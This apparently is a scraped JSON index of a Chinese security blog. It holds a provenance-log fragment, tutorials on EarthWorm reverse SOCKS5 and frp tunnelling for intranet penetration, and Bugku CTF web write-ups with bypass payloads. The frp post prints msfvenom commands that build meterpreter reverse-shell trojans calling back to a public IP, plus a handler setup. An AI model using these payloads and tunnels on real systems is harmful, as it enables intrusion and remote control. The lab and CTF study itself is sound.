&#123; &quot;cf:id&quot;: &quot;245&quot;, &quot;prov:type&quot;: &quot;read_ioctl&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963379&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;read_ioctl&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:gAAAAAAAIIAjAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;291&quot;, &quot;prov:type&quot;: &quot;open&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963462&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;open&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;142979&quot; &#125;, &quot;cf:AAgAAAAAIIAkAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;292&quot;, &quot;prov:type&quot;: &quot;getattr&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963462&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;getattr&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBDxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;142979&quot; &#125;, &quot;cf:AQAAAAAAIIApAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;297&quot;, &quot;prov:type&quot;: &quot;read&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963462&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;read&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:entity&quot;: &quot;cf:AAEAAAAAACBSxgAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAECDLgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;4&quot;, &quot;cf:task_id&quot;: &quot;142979&quot; &#125;, &#125;, &quot;wasGeneratedBy&quot;: &#123; &quot;cf:BAAAAAAAQIDtAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;237&quot;, &quot;prov:type&quot;: &quot;socket_create&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;socket_create&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:AAEAAAAAQIDvAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;239&quot;, &quot;prov:type&quot;: &quot;connect&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;connect&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:QAAAAAAAQIDzAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;243&quot;, &quot;prov:type&quot;: &quot;write_ioctl&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963379&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;write_ioctl&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIAAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:gAAAAAAAQID3AAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;247&quot;, &quot;prov:type&quot;: &quot;memory_write&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963379&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;memory_write&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIQAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFQAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:ACAAAAAAQIBFAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;325&quot;, &quot;prov:type&quot;: &quot;send_msg&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963506&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;send_msg&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:activity&quot;: &quot;cf:AQAAAAAAAEA7JgIAAAAAACgAAACkyYgGIgAAAAAAAAA&#x3D;&quot;, &quot;prov:entity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGCgAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &#125;, &quot;wasDerivedFrom&quot;: &#123; &quot;cf:AAABAAAAgIDrAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;235&quot;, &quot;prov:type&quot;: &quot;sh_read&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;sh_read&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:AAEAAAAAACCB0gAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAAIAAAAACA8JgIAAAAAACgAAACkyYgGFAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;80000d1&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:AAAIAAAAgIDuAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;238&quot;, &quot;prov:type&quot;: &quot;addressed&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;addressed&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:AAAgAAAAACSBLgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:BAAAAAAAgIDwAAAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;240&quot;, &quot;prov:type&quot;: &quot;send_packet&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963341&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;send_packet&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACAVIQAAwKi3gi9dKpaxXAAWBgAAAGi29KA&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125;, &quot;cf:BAAAAAAAgIBpAQAAAAAAACgAAACkyYgGAAAAAAAAAAA&#x3D;&quot;: &#123; &quot;cf:id&quot;: &quot;361&quot;, &quot;prov:type&quot;: &quot;send_packet&quot;, &quot;cf:boot_id&quot;: 40, &quot;cf:machine_id&quot;: &quot;cf:109627812&quot;, &quot;cf:date&quot;: &quot;2021:02:02T07:05:54&quot;, &quot;cf:jiffies&quot;: &quot;4294963941&quot;, &quot;cf:epoch&quot;: 2, &quot;prov:label&quot;: &quot;send_packet&quot;, &quot;cf:allowed&quot;: &quot;true&quot;, &quot;prov:usedEntity&quot;: &quot;cf:ACAAAAAAACCALgIAAAAAACgAAACkyYgGDwAAAAAAAAA&#x3D;&quot;, &quot;prov:generatedEntity&quot;: &quot;cf:AAACAAAAACAVMQAAwKi3gi9dKpaxXAAWBgAAAGi2+bk&#x3D;&quot;, &quot;cf:flags&quot;: &quot;0&quot;, &quot;cf:task_id&quot;: &quot;140859&quot; &#125; &#125;&#125; 顶点属性包括socket,packet,file,path等，边属性包括open,read,connect,send_msg,send_packet等，可以得出使用python (python3.9)本对目录文件进行遍历操作，并与服务器进行socket通信，可视化结果如下(将cc9.json导入可视化平台)：","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"系统监控","slug":"系统监控","permalink":"https://wxt406611016.github.io/tags/%E7%B3%BB%E7%BB%9F%E7%9B%91%E6%8E%A7/"}]},{"title":"配置反向socks5代理实现内网渗透","slug":"内网反向socks代理","date":"2021-01-27T16:00:00.000Z","updated":"2021-01-28T15:20:46.299Z","comments":true,"path":"2021/01/28/内网反向socks代理/","link":"","permalink":"https://wxt406611016.github.io/2021/01/28/%E5%86%85%E7%BD%91%E5%8F%8D%E5%90%91socks%E4%BB%A3%E7%90%86/","excerpt":"EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 EW主页： http://rootkiter.com/EarthWorm/ EW项目地址：https://github.com/idlefire/ew","text":"EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。 EW主页： http://rootkiter.com/EarthWorm/ EW项目地址：https://github.com/idlefire/ew 使用场景 云服务器B 主机A处于内网 主机C处于不同于A的内网 效果：主机A作为主机C的代理，使得主机C能够访问主机A内网内的Web资源 主机A网络不存在公网ip，需要通过反弹到云服务器B的方式创建socks5代理，当另一内网内的主机C挂了云服务器B的正向代理时，即可访问A内网内的Web资源，如下图所示： 上图中，当C挂了B的正向代理时，访问baidu.com时流程如下： 1.C把请求发送给代理B； 2.代理B把请求发送给搭建反向socks5的A； 3.A去请求baidu.com页面； 4.A将baidu.com的返回页面回复给B； 5.B将A的回复信息回复给C，至此，A作为C的代理成功访问； 使用方法首先通过上述链接下载EW项目，其中包含多个系统的版本，根据需要选择，搭建步骤如下： 在阿里云控制台的防火墙页面添加1080和1024两个端口，下面会用到： 在云服务器B(linux)上分别执行以下命令： 12chmod a+x ew_for_linux64 #允许文件以可执行程序运行.&#x2F;ew_for_linux64 -s rcsocks -l 1080 -e 1024 监听vps本机的1080端口并转发到反连1024端口的主机 在主机A(Windows)上，执行以下命令： .\\ew_for_Win.exe -s rssocks -d x.x.x.x -e 1024 通过socks隧道连接公网IP的1024端口，其中x.x.x.x为云服务器ip 服务器和客户端启动正常时，会提示成功： 测试 在主机A(内网ip为192.168.101.32)上，开一个flask服务，web端口为5000； 在主机C上，浏览器利用代理插件配置socks5代理，IP为云服务器的ip(x.x.x.x)，端口为1080: 主机C挂上上一步配置的socks5代理后，访问A的flask服务，成功访问内网web资源： 若有错误，请在评论区指出，感谢！！！","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"内网渗透","slug":"内网渗透","permalink":"https://wxt406611016.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"}]},{"title":"vps+frp实现内网穿透","slug":"vps+frp实现内网穿透","date":"2021-01-27T16:00:00.000Z","updated":"2021-01-29T12:38:06.669Z","comments":true,"path":"2021/01/28/vps+frp实现内网穿透/","link":"","permalink":"https://wxt406611016.github.io/2021/01/28/vps+frp%E5%AE%9E%E7%8E%B0%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","excerpt":"内网穿透的解决方案有很多，之前我一直在用网云穿提供的内网穿透服务。但是我自己有vps，为什么不自己搭一个内网穿透服务呢？又省钱又稳定又安全。网上教程也很多，通过frp搭建是一个好方法，frp全称fast reverse proxy，是一个开源反向代理，只需一个公网ip即可实现内网穿透。 frp项目地址：https://github.com/fatedier/frp/releases","text":"内网穿透的解决方案有很多，之前我一直在用网云穿提供的内网穿透服务。但是我自己有vps，为什么不自己搭一个内网穿透服务呢？又省钱又稳定又安全。网上教程也很多，通过frp搭建是一个好方法，frp全称fast reverse proxy，是一个开源反向代理，只需一个公网ip即可实现内网穿透。 frp项目地址：https://github.com/fatedier/frp/releases 实验环境客户端：kali(无公网ip) 服务端：ubuntu(公网ip) 测试端：windows(无公网，用来测试客户端和服务端的内网穿透效果) 目标：配置端口映射，使得测试端访问服务端的请求能转发到客户端 使用方法通过上述frp项目地址下载压缩包然后解压，文件包含服务端和客户端，其中C表示客户端，S代表服务端: 服务端配置： 因为是服务端配置，所以删掉客户端文件：rm frpc frpc.ini frpc_full.ini 然后修改frps.ini： 123456789101112[common]bind_port &#x3D; 7000dashboard_port &#x3D; 7500dashboard_user &#x3D; xxxdashboard_pwd &#x3D; xxxvhost_http_port &#x3D; 10080说明：bind_port：frp客户端和服务端连接的端口；dashbaord_port,user,pwd：分别为控制面板的web端口和登录的用户和密码；vhost_http_port：反向代理http主机端口，则即通过vps_ip:vhost_http_port访问内网web服务若使用https：vhost_https_port &#x3D; 10443 保存后，在文件所在目录启动运行： 12.&#x2F;frps -c .&#x2F;frps.ini #前台运行nohup .&#x2F;frps -c .&#x2F;frps.ini &amp; #后台运行 终端显示如下信息表示成功启动： ps：开启后，还需要在阿里云的控制台的防火墙页面添加相应端口，例如本例中需添加10080，7500，7000 客户端配置 删除无用服务端文件:rm frps frps.ini frps_full.ini 然后修改frpc.ini: 1234567891011121314151617181920212223242526[common]server_addr &#x3D; 公网ipserver_port &#x3D; 7000[web]type &#x3D; httplocal_port &#x3D; 5000custom_domains &#x3D; 公网ip[ssh]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 22remote_port &#x3D;2222[msf]type &#x3D; tcplocal_ip &#x3D; 127.0.0.1local_port &#x3D; 4444remote_port &#x3D; 10081custom_domains &#x3D; 公网ip说明：[web]:通过公网ip+10080可以访问开在客户端5000端口的web服务[ssh]:通过公网ip+2222端口可以连接客户端(客户端ssh端口为22)[msf]:肉鸡访问公网ip+10081可以反弹shell(攻击者在本地监听4444端口) 保存后，在文件所在目录启动运行： 12.&#x2F;frpc -c .&#x2F;frpc.ini #前台运行nohup .&#x2F;frpc -c .&#x2F;frpc.ini &amp; #后台运行 终端显示如下信息表示成功启动： ps：开启后，还需要在阿里云的控制台的防火墙页面添加相应端口，例如本例中需添加10080，10081，2222，其他配置可以参考官方文档：https://gofrp.org/docs/ 测试搭建完成后，任意主机可通过访问公网ip+7500端口访问dashboard页面，可看到tcp页面已有两条信息： Web测试： 在客户端(kali)的5000端口开启一个flask服务： 任意一台主机可通过公网ip+10080端口访问客户端(kali)的web服务，使用测试端主机测试： 测试成功！ ssh测试： 测试端(windows)使用Xshell配置ssh，主机填写公网ip，端口填写frpc.ini中配置的2222端口： 然后在测试端输入客户端(kali)的用户名和密码，成功登录客户端(kali)主机： msf测试 在客户端(kali)先利用msf生成一个windows马：msfvenom -p windows/meterpreter/reverse_tcp LHOST=公网ip LPORT=10081 -f exe -o frptest.exe 接着客户端(kali)配置msf模块，监听本地4444端口： 12345use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_tcpset lhost 127.0.0.1set lport 4444run 然后将生成的windows马拷贝到测试端(windows)上，运行该木马后，在客户端(kali)上会反弹shell，测试成功： ps: 附几个生成马的payload： 12msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;公网ip LPORT&#x3D;10081 -f exe -o frptest.exemsfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;公网ip lport&#x3D;10081 -f elf -o frptest.elf","categories":[{"name":"Web","slug":"Web","permalink":"https://wxt406611016.github.io/categories/Web/"}],"tags":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://wxt406611016.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}]},{"title":"Bugku Web总结(持续更新ing)","slug":"Bugku Web总结(持续更新ing)","date":"2021-01-21T16:00:00.000Z","updated":"2021-01-29T12:48:58.991Z","comments":true,"path":"2021/01/22/Bugku Web总结(持续更新ing)/","link":"","permalink":"https://wxt406611016.github.io/2021/01/22/Bugku%20Web%E6%80%BB%E7%BB%93(%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0ing)/","excerpt":"Bugku对于入门CTF的小白还是挺适合的，新版的Bugku和旧版有些不同，而且此前也没有整理过ctf web的骚操作，正好借这个机会补一补，总结新版Bugku Web中典型题目的wp，和一些常用函数的介绍，以及基础绕过姿势的总结。 ps：题目环境的flag可能随机生成，所以每道题的flag不一定固定！","text":"Bugku对于入门CTF的小白还是挺适合的，新版的Bugku和旧版有些不同，而且此前也没有整理过ctf web的骚操作，正好借这个机会补一补，总结新版Bugku Web中典型题目的wp，和一些常用函数的介绍，以及基础绕过姿势的总结。 ps：题目环境的flag可能随机生成，所以每道题的flag不一定固定！ Web 5tip: 矛盾 题目要求GET参数num要满足两个条件： !is_numeric($num) $num==1 即num不是数字，且num要等于1；利用php中弱相等符号(==)的特性，构造num=1a来绕过，轻松得到flag{d25c3c84d25fbc1e5d6b14ac16d2c941} Web 8tip: 文件包含 123456&lt;?php include &quot;flag.php&quot;; $a &#x3D; @$_REQUEST[&#39;hello&#39;]; eval( &quot;var_dump($a);&quot;); show_source(__FILE__);?&gt; 由源码可知要对输入的参数进行var_dump操作，利用file函数构造payload，file()函数用于读取文件内容，将整个文件读入数组中。payload为?hello=file(‘flag.php’)，轻松得到flag{82450de31e54c7263e735f2be3619c66} Web 9tip: flag In the variable ! 1234567if(isset($_GET[&#39;args&#39;]))&#123; $args &#x3D; $_GET[&#39;args&#39;]; if(!preg_match(&quot;&#x2F;^\\w+$&#x2F;&quot;,$args))&#123; die(&quot;args error!&quot;); &#125; eval(&quot;var_dump($$args);&quot;);&#125; $args需要满足正则匹配/^\\w+$/，然后执行var_dump操作，注意到var_dump中$args前还有一个$符号，根据提示猜测flag藏在全局变量GLOBALS中，构造payload为?args=GLOBALS，轻松得到flag{4ffb43bb1468970faace8bdbb0c5c59e} ps: 对于/^\\w+$/i，两端/ /表示开始和结束；^表示开始字符串；$表示结束字符串；\\w表示包含[a-z，A-Z, _ , 0-9]；+表示一个或者多个\\w；后面的i表示不区分大小写； 在PHP中$GLOBALS的作用是：引用全局作用域中可用的全部变量; Web 11tip: 网站被黑了 黑客会不会留下后门 利用dirmap或其他工具扫描站点，找到shell.php页面，需要密码登录，利用密码字典和burpsuite进行爆破攻击，得到flag{d6ca23ac2b9ab6fd2f54c639ff5b4eb6} 社工-伪造tip: 伪造信息 随便登录一个账号进去，在和小美的聊天窗输入flag，提示 “我只告诉我的男朋友，他说除了他谁能不能说哦。”，然后查看小美的空间，发现了小美的男朋友备注是 “小bug” 。 OK了，可以开始伪造了，将自己的qq号昵称改为 “小bug” ，然后用昵称为 “小bug” 的账号登录，在聊天窗输入flag，就可以得到flag{9b6463a15d77d778e0bcab037b7b2e83} Web 14tip: flag在index里 进入题目点击链接(click me? no)，点击后注意到url变化为index.php?file=show.php，典型的文件包含，利用filter伪协议构造payload为?file=php://filter/read=convert.base64-encode/resource=index.php，读取后进行base64解码得到flag{89382da3663b64c9adfbd35a90c31981} Web 16tip: 备份是个好东西 根据提示备份直接下载index.php.bak文件，然后审计源码 12345678910$str &#x3D; strstr($_SERVER[&#39;REQUEST_URI&#39;], &#39;?&#39;);$str &#x3D; substr($str,1);$str &#x3D; str_replace(&#39;key&#39;,&#39;&#39;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) &#x3D;&#x3D; md5($key2) &amp;&amp; $key1 !&#x3D;&#x3D; $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125; 根据源码可知对key字符串进行了过滤，可用kkeyey绕过；同时要求解析后的key1和key2值不同，但是md5相同。md5的绕过方法有很多种，这里介绍三种方法，一个是0e绕过弱相等，一个是利用数组绕过，还有一个md5碰撞，利用fastcoll生成两组md5相同的字符串； 法一：利用md5的弱相等性，在弱比较里，0e开头的会被识别成科学计数法，结果均为0，可构造两个字符串的md5值都以0e开头，payload为?kkeyey1=QNKCDZO&amp;kkeyey2=s878926199a，即可得到flag{738457a5de32daabfaa435caea830c75} 法二：md5无法处理数组，当遇到数组时会返回NULL，因此可以利用数组绕过(数组绕过可以绕过强判断===) 法三：md5碰撞，利用fastcoll生成两段md5相等的文本(fastcoll.exe -p source.txt -o 1.txt 2.txt)，因为有乱码所以将这些字符串进行url编码处理，可以构造payload,kkeyey1和kkeyey2的值分别为：123kkeyey1&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-%B6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4A%80zu%B2%C1qf%00%F6%97J%D2%A7%40%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9Z%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b%B0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86CO%C4+%93kkeyey2&#x3D;123%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%003%9F%05%08%F2%7C%D5N%A9%C8%D1o%ACD%0C%1Cy%C2-6%1F%2F%D8%8C%24%CA%7F%AEo%2A%93%E0j%E3%FF%C7%82%C4%9D%AB%CBm%3B%9C%A4%C1%80zu%B2%C1qf%00%F6%97J%D2%A7%C0%7D%9F%5C2%CA%DA%0DC%0B%A1r%EC_%D826%E7%EC%1C%E9%C1%5E9%DA%22%88%FF%8A%7C%D9%F3W%5B%10%CD%C1%9D%B9%B0.%04%92%83%B6%AA%9A%E7%B8b0%5EG%A8%CD%8Bm%9E%A2%EB%3B%A8%E4%86%C3O%C4+%93 通过三种方法的payload都可得到flag{738457a5de32daabfaa435caea830c75} ps:总结几个常见的php函数，strstr()，substr()和parse_str() strstr(string,a,b)：其中string和a是必填，b为选填，作用为判度string中是否存在a，若存在返回a以及a后的全部字符，如strstr(“Hello world!”,”wo”)的输出为world! ; substr(string,start,length):其中string和start为必填，length为选填，函数返回值为string字符串从第start个字符起，往后length个字符，如substr(“Hello world”,1)的输出为ello world ; parse_str(string,array)：其中string为必填，array为选填，函数作用为把查询字符串解析到变量中。如parse_str(“name=Bill&amp;age=60”)作用是解析生成了两个变量$name=Bill和$age=60 ； Web 20tip: cookies欺骗 Bugku中有好几道脚本题，选择了这一道写个wp。进入页面后在url处发现疑点，filename为base64编码后的文件名，line为所在行数，作用为读取文件的第line行显示到页面中。于是乎，写个脚本读取index.php的所有行数，脚本如下所示； 12345import requestsfor i in range(50): url&#x3D;f&quot;http:&#x2F;&#x2F;114.67.246.176:10508&#x2F;index.php?line&#x3D;&#123;str(i)&#125;&amp;filename&#x3D;aW5kZXgucGhw&quot; s&#x3D;requests.get(url) print(s.text) 通过上面的脚本得到index.php的源码： 1234567891011121314$file&#x3D;base64_decode(isset($_GET[&#39;filename&#39;])?$_GET[&#39;filename&#39;]:&quot;&quot;);$line&#x3D;isset($_GET[&#39;line&#39;])?intval($_GET[&#39;line&#39;]):0;if($file&#x3D;&#x3D;&#39;&#39;) header(&quot;location:index.php?line&#x3D;&amp;filename&#x3D;a2V5cy50eHQ&#x3D;&quot;);$file_list &#x3D; array(&#39;0&#39; &#x3D;&gt;&#39;keys.txt&#39;,&#39;1&#39; &#x3D;&gt;&#39;index.php&#39;,);if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]&#x3D;&#x3D;&#39;margin&#39;)&#123;$file_list[2]&#x3D;&#39;keys.php&#39;;&#125;if(in_array($file, $file_list))&#123;$fa &#x3D; file($file);echo $fa[$line];&#125; 审计源码发现需要设置cookie值margin=margin，将keys.php导入file_list数组中，然后通过filename和line来读取keys.php的内容，keys.php的base64编码为a2V5cy5waHA=，从而构造payload为?line=&amp;filename=a2V5cy5waHA=,并利用burpsuite修改cookie值为margin=margin后，得到flag{47a96001690bf176b7c935eb14c418cf} ps:总结一个intval()函数，返回值为获取变量的整数值 Web 21tip: never never never give up!!! 查看页面源代码，提示1p.html，访问1p.html直接跳转到bugku官方url，通过burpsuite拦截1p.html的返回内容，发现base64编码字符串，进行base64解码，再进行url解码，得到源码，进行审计： 12345678910111213141516171819202122if(!$_GET[&#39;id&#39;]) &#x2F;&#x2F;id要求不为0&#123; header(&#39;Location: hello.php?id&#x3D;1&#39;); exit();&#125;$id&#x3D;$_GET[&#39;id&#39;];$a&#x3D;$_GET[&#39;a&#39;];$b&#x3D;$_GET[&#39;b&#39;];if(stripos($a,&#39;.&#39;))&#123; echo 